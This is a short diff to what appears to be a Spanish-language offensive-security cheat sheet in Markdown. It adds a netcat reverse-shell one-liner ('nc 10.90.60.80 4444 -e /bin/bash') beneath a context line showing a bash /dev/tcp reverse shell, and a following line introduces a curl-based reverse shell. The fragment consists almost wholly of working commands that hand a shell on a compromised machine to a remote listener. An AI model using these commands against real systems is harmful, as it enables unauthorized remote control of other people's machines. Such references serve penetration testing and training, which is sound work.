@@ -174,6 +174,12 @@ bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 
 ```
 
+Con nc si es que existe en la maquina enviate una reverseshell
+
+```
+nc 10.90.60.80 4444 -e /bin/bash
+```
+
 Puedes usar curl para ejecutar una shell reversa aprovechandote de curl:
 
 ```
